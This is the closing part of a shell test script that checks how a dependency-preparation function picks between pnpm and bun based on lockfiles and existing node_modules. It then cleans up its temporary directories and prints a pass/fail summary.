if [ -s "$BREC" ]; then FAIL=$((FAIL + 1)); echo "FAIL: pnpm a bun not called"; else PASS=$((PASS + 1)); echo "PASS: pnpm a bun not called"; fi

echo "--- pnpm b: empty directory does not call pnpm ---"
: > "$PREC"
PTMPB="$(mktemp -d)"
poutb="$(cd "$PTMPB" && PATH="$PBIN:/usr/bin:/bin" dprep_ensure_js_deps)"
prcb=$?
assert_eq "pnpm b rc" "0" "$prcb"
assert_contains "pnpm b skip" "dprep: no package.json with a bun lockfile, skipping" "$poutb"
if [ -s "$PREC" ]; then FAIL=$((FAIL + 1)); echo "FAIL: pnpm b stub not called"; else PASS=$((PASS + 1)); echo "PASS: pnpm b stub not called"; fi

echo "--- pnpm c: bun.lock only takes the bun path ---"
: > "$PREC"
: > "$BREC"
PTMPC="$(mktemp -d)"
printf '{}\n' > "$PTMPC/package.json"
: > "$PTMPC/bun.lock"
poutc="$(cd "$PTMPC" && PATH="$PBIN:/usr/bin:/bin" dprep_ensure_js_deps)"
prcc=$?
assert_eq "pnpm c rc" "0" "$prcc"
assert_eq "pnpm c bun argv" "install --frozen-lockfile" "$(cat "$BREC")"
assert_contains "pnpm c bun installing line" "dprep: installing JS dependencies (bun install --frozen-lockfile)" "$poutc"
if [ -s "$PREC" ]; then FAIL=$((FAIL + 1)); echo "FAIL: pnpm c pnpm not called"; else PASS=$((PASS + 1)); echo "PASS: pnpm c pnpm not called"; fi

echo "--- pnpm d: node_modules present skips pnpm ---"
: > "$PREC"
PTMPD="$(mktemp -d)"
printf '{}\n' > "$PTMPD/package.json"
: > "$PTMPD/pnpm-lock.yaml"
mkdir -p "$PTMPD/node_modules"
poutd="$(cd "$PTMPD" && PATH="$PBIN:/usr/bin:/bin" dprep_ensure_js_deps)"
prcd=$?
assert_eq "pnpm d rc" "0" "$prcd"
assert_contains "pnpm d skip" "dprep: node_modules present, skipping" "$poutd"
if [ -s "$PREC" ]; then FAIL=$((FAIL + 1)); echo "FAIL: pnpm d stub not called"; else PASS=$((PASS + 1)); echo "PASS: pnpm d stub not called"; fi

unset RST_NPX_BIN RST_NPM_BIN GH_TOKEN
unset TELEGRAM_BOT_TOKEN TELEGRAM_STREAMING_MODE TELEGRAM_APPROVAL_CHAT_ID TELEGRAM_ALLOWED_USER_IDS TELEGRAM_TEST_FIXTURE
export PATH="$ORIG_PATH"
rm -rf "$BIN" "$TMP" "$TMP2" "$TMP3" "$TMP4" "$TMP5" "$TMP6" "$TMP7" "$RST_TG" "$T5" "$T6_EMPTY" "$PBIN" "$PTMP" "$PTMPB" "$PTMPC" "$PTMPD"

echo
echo "run-stop-tests.sh: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
